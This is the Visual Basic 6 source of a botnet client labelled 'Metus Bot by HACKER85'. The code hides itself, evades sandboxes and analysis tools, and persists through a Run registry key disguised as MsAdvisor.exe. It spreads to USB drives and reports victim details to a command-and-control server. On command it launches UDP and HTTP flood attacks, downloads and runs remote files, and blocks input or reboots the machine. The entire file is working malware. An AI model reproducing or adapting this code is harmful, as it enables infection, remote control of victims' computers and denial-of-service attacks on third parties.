VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   " "
   ClientHeight    =   3030
   ClientLeft      =   105
   ClientTop       =   240
   ClientWidth     =   4695
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3030
   ScaleWidth      =   4695
   Begin VB.Timer syntimer 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   1320
      Top             =   480
   End
   Begin VB.Timer Timer2 
      Interval        =   5000
      Left            =   600
      Top             =   480
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   1080
      TabIndex        =   6
      Top             =   2160
      Width           =   375
   End
   Begin VB.TextBox txtroot 
      Height          =   285
      Left            =   360
      TabIndex        =   5
      Top             =   2160
      Width           =   615
   End
   Begin VB.TextBox host 
      Height          =   285
      Left            =   1920
      TabIndex        =   4
      Top             =   2160
      Width           =   855
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   3000
      TabIndex        =   3
      Top             =   1680
      Width           =   495
   End
   Begin BotProj.Socket HTTPSocket 
      Index           =   0
      Left            =   3120
      Top             =   960
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin BotProj.Socket UDPSocket 
      Index           =   0
      Left            =   1200
      Top             =   960
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin BotProj.Socket Socket1 
      Left            =   600
      Top             =   960
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin VB.TextBox txtip 
      Height          =   285
      Left            =   120
      TabIndex        =   2
      Top             =   1680
      Width           =   1095
   End
   Begin VB.TextBox txtinv 
      Height          =   285
      Left            =   1200
      TabIndex        =   1
      Top             =   1680
      Width           =   855
   End
   Begin VB.TextBox txtpck 
      Height          =   285
      Left            =   2040
      TabIndex        =   0
      Top             =   1680
      Width           =   615
   End
   Begin VB.Timer Time2 
      Index           =   0
      Left            =   3600
      Top             =   960
   End
   Begin VB.Timer time1 
      Index           =   0
      Left            =   2760
      Top             =   960
   End
   Begin VB.Timer time 
      Enabled         =   0   'False
      Index           =   0
      Left            =   1680
      Top             =   960
   End
   Begin VB.Timer Timer1 
      Interval        =   10000
      Left            =   120
      Top             =   960
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'/Metus Bot by HACKER85
Private Type command
udp As String
Apache As String
ICMP As String
HTTP As String
End Type
Private Type ddos
Socket As String
string4 As String
Ip As String
Prt As String
Inter As String
Packet As String
poz As String
Pos As String
Pof As String
End Type
Private Type Procedures
dynamic As String
End Type
Dim Y As Boolean
Dim poo As command
Dim super As ddos
Function struser() As String
struser = String$(256, Chr$(0))
GetUsername struser, Len(struser)
End Function
Function StrComputer() As String
StrComputer = String$(15, Chr$(0))
GetComputerName StrComputer, Len(StrComputer)
End Function
Function GetCountry() As String
GetCountry = String$(256, Chr$(0))
GetCountry = Left$(GetCountry, GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SENGCOUNTRY, GetCountry, Len(GetCountry)) - 1)
End Function
Private Sub Timer1_Timer()
On Error Resume Next
If Socket1.State <> 7 Then
With Socket1
.CloseSck
.RemoteHost = Builderdata
.RemotePort = "3176"
.Connect
End With
End If
End Sub
Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Call Socket1_CloseSck
End
End Sub

Private Sub Form_Terminate()
Call Socket1_CloseSck
End
End Sub

Private Sub Form_Unload(Cancel As Integer)
Call Socket1_CloseSck
End
End Sub

Private Sub Socket1_CloseSck()
Socket1.CloseSck
End Sub
Private Sub HTTPSocket_Closesck(Index As Integer)
On Error Resume Next
HTTPSocket(Index).CloseSck
HTTPSocket(Index).Connect pckt.Ip, 80
End Sub
Private Sub HTTPSocket_Connect(Index As Integer)
On Error Resume Next
With pckt
HTTPSocket(Index).SendData "GET http://" & .Ip & "" & " HTTP/1.0" & vbCrLf & vbCrLf
End With
End Sub
Function HTTP()
On Error Resume Next
Dim i As Integer
If poo.HTTP <> 0 Then Socket1.SendData "Status: [HTTP - Already Enabled]": Exit Function
poo.HTTP = 1
With pckt
For i = 1 To .Socket
Unload HTTPSocket(i)
Load HTTPSocket(i)
Unload Time2(i)
Load Time2(i)
Time2(i).Enabled = False
Time2(i).interval = 100
HTTPSocket(i).CloseSck
HTTPSocket(i).Protocol = sckTCPProtocol
HTTPSocket(i).Connect .Ip, 80
Time2(i).Enabled = True
Next i
Socket1.SendData "Status: [ HTTP - Attack Enabled ]"
End With
End Function
Function httpstop()
On Error Resume Next
Dim i As Integer
For i = 1 To Time2.UBound
Time2(i).Enabled = False
HTTPSocket(i).CloseSck
Next i
End Function
Private Sub HTTPSocket_DataArrival(Index As Integer, ByVal bytesTotal As Long)
On Error Resume Next
Dim dat As String
HTTPSocket(Index).GetData dat
Debug.Print dat
HTTPSocket(Index).CloseSck
HTTPSocket(Index).Connect pckt.Ip, 80
End Sub
Private Sub HTTPSocket_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
HTTPSocket(Index).CloseSck
HTTPSocket(Index).Connect pckt.Ip, 80
End Sub
Private Sub Time2_Timer(Index As Integer)
On Error Resume Next
With pckt
HTTPSocket(Index).CloseSck
HTTPSocket(Index).Connect .Ip, 80
End With
End Sub

Private Sub Socket1_Error(ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Call Socket1_CloseSck
End Sub

Private Sub time_Timer(Index As Integer)
On Error Resume Next
UDPSocket(Index).CloseSck
UDPSocket(Index).SendData "¶¶¶¶OWNNNNN!" & String(super.Packet, Chr(Int(Rnd * 255))) & vbNullString
End Sub
Private Sub Timer2_Timer()
InfectUSB (App.EXEName & ".exe")
End Sub

Private Sub Socket1_Connect()
Dim Status As Integer
Status = 0
If poo.udp <> "0" Then Status = Status + 1
Socket1.SendData "Idle..." & " | " & "1.1" & " | " & GetCountry & " | " & Form1.Text1.Text & "@" & StrComputer & " | " & GetOSVersion & ""
End Sub
Private Sub Socket1_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim data As String
Socket1.GetData data
Dim i As Integer
If checks = True Then Exit Sub
  If InStr(data, "UDP") Then
  With super
  .Socket = Split(data, "^")(1)
  .Socket = Split(.Socket, "*")(0)
  .Ip = Split(data, "*")(1)
  .Ip = Split(.Ip, ":")(0)
  .Prt = Split(data, ":")(1)
  .Prt = Split(.Prt, "#")(0)
  .Packet = Split(data, "#")(1)
  .Packet = Split(.Packet, "/")(0)
  .Inter = Split(data, "/")(1)
  .Inter = Split(.Inter, "")(0)
 Call udp
 End With
 ElseIf InStr(data, "HTTP") Then
With pckt
    .Socket = Split(data, "^")(1)
    .Socket = Split(.Socket, "*")(0)
    .Ip = Split(data, "*")(1)
    .Ip = Split(.Ip, "/")(0)
    .Inter = Split(data, "/")(1)
    .Inter = Split(data, "")(0)
    Call HTTP
    End With
 ElseIf InStr(data, "STOP") Then
poo.udp = 0
poo.HTTP = 0
Call udpstop
Socket1.SendData "Status: [ All Attacks Disabled ]"
ElseIf InStr(data, "HideTask") Then
Call HideTaskBar
ElseIf InStr(data, "ShowTask") Then
Call ShowTaskBar
ElseIf InStr(data, "Chat") Then
frmMain.Show
ElseIf InStr(data, "Endit") Then
Unload frmMain
ElseIf InStr(data, "PlzFrz") Then
    DoEvents
    BlockInput True
    Sleep 10000
    BlockInput False
ElseIf InStr(data, "FUCKYOU") Then
With super
.Pof = Split(data, "6")(1)
.Pof = Split(.Pof, "0")(0)
string4 = .Pof
.Pos = Split(data, "3")(1)
.Pos = Split(.Pos, "5")(0)
Text2.Text = .Pos
If Dir(Form1.txtroot.Text & "Windows\" & "Config\MsAdvisor.exe") <> "" Then
CopyURLToFile (Text2.Text), Form1.txtroot.Text & "Windows\" & "Config\" & string4
Shell Form1.txtroot.Text & "Windows\" & "Config\" & string4, vbNormalFocus
Else
CopyURLToFile (Text2.Text), Form1.txtroot.Text & "Users\" & Form1.Text1.Text & "\AppData\Local\Microsoft\Windows\Explorer\" & string4
Shell Form1.txtroot.Text & "Users\" & Form1.Text1.Text & "\AppData\Local\Microsoft\Windows\Explorer\" & string4, vbNormalFocus
End If
End With
ElseIf InStr(data, "Web") Then
With super
.poz = Split(data, "$")(1)
.poz = Split(.poz, "?")(0)
string2 = .poz
ShellExecute 0, "Open", string2, "", "", vbNormalFocus
End With
ElseIf InStr(data, "Tray") Then       'Open CD Tray
Dim lRet As Long
Dim returnstring As String
lRet = mciSendString("set CDAudio door open", returnstring, 127, 0)
ElseIf InStr(data, "DeskHide") Then
DesktopIconsHide
ElseIf InStr(data, "Reboot") Then
WINReboot
ElseIf InStr(data, "Shutdown") Then
WINShutdown
ElseIf InStr(data, "DeskShow") Then
DesktopIconsShow
ElseIf InStr(data, "Uninstall") Then
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
Reg.Regdelete "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\MsAdvisor.exe"
End
End If
End Sub
Function udp()
On Error Resume Next
Dim x As Integer
If poo.udp <> 0 Then Socket1.SendData "Status: [UDP - Already Enabled]": Exit Function
poo.udp = 1
With super
For x = 1 To .Socket
Unload UDPSocket(x)
Load UDPSocket(x)
Unload time(x)
Load time(x)
time(x).Enabled = False
time(x).interval = 500
UDPSocket(x).CloseSck
UDPSocket(x).Protocol = sckUDPProtocol
UDPSocket(x).Connect .Ip, .Prt
time(x).Enabled = True
Next x
Socket1.SendData "Status: [ UDP - Attack Enabled ]"
End With
End Function
Function udpstop()
On Error Resume Next
Dim i As Integer
For i = 1 To time.UBound
time(i).Enabled = False
UDPSocket(i).CloseSck
Next i
End Function
Private Sub UDPSocket_CloseSck(Index As Integer)
On Error Resume Next
With super
UDPSocket(Index).CloseSck
UDPSocket(Index).Protocol = sckUDPProtocol
UDPSocket(Index).Connect .Ip, .Prt
End With
End Sub

Private Sub udpsocket_Connect(Index As Integer)
On Error Resume Next
With super
UDPSocket(Index).CloseSck
UDPSocket(Index).Protocol = sckUDPProtocol
UDPSocket(Index).Connect .Ip, .Prt
End With
End Sub

Private Sub udpsocket_DataArrival(Index As Integer, ByVal bytesTotal As Long)
On Error Resume Next
With super
UDPSocket(Index).CloseSck
UDPSocket(Index).Protocol = sckUDPProtocol
UDPSocket(Index).Connect .Ip, .Prt
End With
End Sub

Private Sub udpsocket_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
With super
UDPSocket(Index).CloseSck
UDPSocket(Index).Protocol = sckUDPProtocol
UDPSocket(Index).Connect .Ip, .Prt
End With
End Sub

Private Sub udpsocket_SendComplete(Index As Integer)
On Error Resume Next
With super
UDPSocket(Index).CloseSck
UDPSocket(Index).Protocol = sckUDPProtocol
UDPSocket(Index).Connect .Ip, .Prt
End With
End Sub
Private Sub FileSender1_Connected()
End Sub
Private Sub Form_Initialize()
On Error Resume Next
Dim options As String
App.TaskVisible = False
Me.Visible = False
App.Title = ""
Me.Caption = ""
anubisDetect
Get_User_Name
sandboxDetecT
FaiLsafEXP
FaiLsafEVista
CustomMelt
HideMainExe
Builderdata
With Socket1
.CloseSck
.RemoteHost = Builderdata
.RemotePort = "3176"
.Connect
End With

Dim Reg As Object
If Dir(Form1.txtroot.Text & "Windows\" & "Config\MsAdvisor.exe") <> "" Then
Set Reg = CreateObject(SimpleDeCrypt("_CðßËmšw\K3"))
Reg.Regwrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & "MsAdvisor.exe", Form1.txtroot.Text & "Windows\" & "Config\" & App.EXEName & ".exe"
Else
Set Reg = CreateObject(SimpleDeCrypt("_CðßËmšw\K3"))
Reg.Regwrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & "MsAdvisor.exe", Form1.txtroot.Text & "Users\" & Form1.Text1.Text & "\AppData\Local\Microsoft\Windows\Explorer\" & App.EXEName & ".exe"
End If
End Sub

Private Sub Form_Load()
 On Error Resume Next
    host = Builderdata
 '/Get Your Builder Data
With poo
.Apache = "0"
.HTTP = "0"
.ICMP = "0"
.udp = "0"
End With

End Sub

Sub Pause(interval)
Dim Current
Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Sub
